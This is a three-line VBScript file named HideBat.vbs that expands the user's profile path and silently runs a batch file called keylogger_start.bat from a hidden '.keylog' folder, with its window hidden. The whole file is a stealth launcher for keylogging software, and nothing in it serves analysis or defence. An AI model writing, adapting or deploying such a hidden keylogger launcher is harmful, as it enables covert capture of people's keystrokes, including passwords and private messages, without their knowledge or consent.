'HideBat.vbs
Set oShell = CreateObject("WScript.Shell")
strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
CreateObject("Wscript.Shell").Run strHomeFolder + "\.keylog\keylogger_start.bat", 0, True
